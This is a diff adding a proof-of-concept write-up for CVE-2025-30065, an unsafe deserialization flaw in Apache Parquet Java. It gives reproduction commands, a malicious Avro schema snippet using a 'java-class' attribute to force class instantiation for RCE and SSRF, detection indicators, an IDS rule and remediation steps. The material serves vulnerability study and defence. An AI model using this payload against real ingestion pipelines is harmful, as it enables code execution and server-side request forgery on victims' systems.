@@ -1,0 +1,188 @@
+# Apache Parquet Java Unsafe Deserialization RCE (CVE-2025-30065)
+
+<!-- 
+  File: 2026-05-16_apache-parquet-unsafe-deserialization-rce.md
+  Location: pocs/misc/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-16 |
+| **Author / Researcher** | mouadk |
+| **CVE / Advisory** | CVE-2025-30065 |
+| **Category** | misc |
+| **Severity** | Critical |
+| **CVSS Score** | 10.0 (CVSSv3) |
+| **Status** | Weaponized |
+| **Tags** | RCE, unsafe-deserialization, parquet-avro, avro-schema, Java, JVM, SSRF, data-pipeline |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Apache Parquet Java (`parquet-avro`) schema parsing consumers |
+| **Versions Affected** | Vulnerable `parquet-avro` releases impacted by CVE-2025-30065 (source PoC demonstrates 1.8.1) |
+| **Language / Platform** | Java 17+, JVM-based data processing pipelines |
+| **Authentication Required** | No (if attacker can feed crafted Parquet data into ingestion path) |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+CVE-2025-30065 is an unsafe deserialization issue in Apache Parquet Java schema handling that can instantiate attacker-controlled classes while parsing malicious Parquet/Avro metadata. The provided PoC demonstrates two practical outcomes: arbitrary command execution when a gadget/class is present on the classpath, and SSRF by forcing JVM-side network requests through class instantiation. The attack surface is broad because many analytics and ETL ecosystems parse Parquet data automatically.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+`parquet-avro` schema parsing trusts attacker-influenced schema attributes such as `java-class`, allowing reflective class loading/instantiation during record materialization. This creates a deserialization-like gadget path from data input to code execution side effects.
+
+### Attack Vector
+
+An attacker delivers a crafted Parquet file into a vulnerable ingestion workflow (batch upload, object store ingestion, pipeline import, etc.). When the victim service reads the file with vulnerable Parquet Java libraries, malicious schema metadata triggers dangerous object construction.
+
+### Impact
+
+Successful exploitation can trigger SSRF and, with suitable classpath gadgets or reachable constructors, remote code execution in the JVM context of the data pipeline service. In enterprise environments this can lead to lateral movement, secret access, or full processing-node compromise.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Linux/macOS attacker and victim lab hosts
+Target:      Java application using vulnerable parquet-avro builds (source PoC demonstrates 1.8.1)
+Attacker:    Any host that can provide malicious Parquet input
+Tools:       Java 17, Maven, Python (for HTTP callback listener)
+```
+
+### Setup Steps
+
+```bash
+# Clone source PoC
+git clone https://github.com/mouadk/parquet-rce-poc-CVE-2025-30065
+cd parquet-rce-poc-CVE-2025-30065
+
+# Build
+mvn -q clean package
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Generate malicious Parquet (RCE-oriented class instantiation path).**
+   ```bash
+   mvn -q exec:java -Dexec.mainClass=com.evil.GenerateMaliciousParquet
+   ```
+
+2. **Trigger vulnerable read path.**
+   ```bash
+   mvn -q exec:java -Dexec.mainClass=com.victim.Reader
+   ```
+
+3. **Run SSRF variant (more realistic attacker outcome).**
+   ```bash
+   python3 -m http.server 8000
+   mvn -q exec:java -Dexec.mainClass=com.evil.GenerateMaliciousParquetSSRF
+   mvn -q exec:java -Dexec.mainClass=com.victim.ReaderSSRF
+   ```
+
+### Exploit Code
+
+> See copied source files in this folder:
+> - `src/main/java/com/evil/GenerateMaliciousParquet.java`
+> - `src/main/java/com/evil/GenerateMaliciousParquetSSRF.java`
+> - `src/main/java/com/evil/RCEPayload.java`
+> - `src/main/java/com/victim/Reader.java`
+> - `src/main/java/com/victim/ReaderSSRF.java`
+
+```java
+String schemaSSRF = """
+{
+  "type": "record",
+  "name": "MaliciousRecord",
+  "fields": [{
+    "name": "evil",
+    "type": {
+      "type": "string",
+      "java-class": "javax.swing.JEditorPane"
+    }
+  }]
+}
+""";
+```
+
+### Expected Output
+
+```
+CVE-2025-30065 Poc: malicious parquet generated->exploit.parquet
+CVE-2025-30065 Poc: malicious parquet generated->exploit-ssrf.parquet
+# listener logs show outbound HTTP callback from victim JVM
+```
+
+---
+
+## Screenshots / Evidence
+
+- `screenshots/01_rce_payload_execution.png` — command-execution PoC output flow
+- `screenshots/02_ssrf_callback_evidence.png` — SSRF callback evidence from victim JVM
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+# Potential indicators:
+# - Unexpected "java-class" attributes in Avro/Parquet schemas from untrusted sources
+# - Outbound callbacks from data-processing JVMs during Parquet ingestion
+# - Suspicious class-loading or constructor invocation traces during Parquet read operations
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert http $DATA_PLATFORM any -> any any (
+  msg:"Possible CVE-2025-30065 SSRF callback from Parquet processing node";
+  flow:to_server,established;
+  content:"User-Agent|3a| Java";
+  sid:9525030065; rev:1;
+)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade Apache Parquet Java to a release that fixes CVE-2025-30065 per official advisory |
+| **Workaround** | Reject untrusted Parquet files and disable/limit schema-driven dynamic class behaviors where possible |
+| **Config Hardening** | Isolate pipeline runtimes, constrain egress, and monitor classloading/network activity during ingestion |
+
+---
+
+## References
+
+- [CVE-2025-30065 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-30065)
+- [Apache Parquet Java repository](https://github.com/apache/parquet-java)
+- [Source Repository — mouadk/parquet-rce-poc-CVE-2025-30065](https://github.com/mouadk/parquet-rce-poc-CVE-2025-30065)
+- [Technical analysis blogpost by source researcher](https://www.deep-kondah.com/parquet-under-fire-a-technical-analysis-of-cve-2025-30065)
+
+---
+
+## Notes
+
+Auto-ingested from https://github.com/mouadk/parquet-rce-poc-CVE-2025-30065 on 2026-05-16.
+For repository safety, the archived `pom.xml` pins patched dependency versions (parquet-avro 1.15.2, avro 1.11.4).
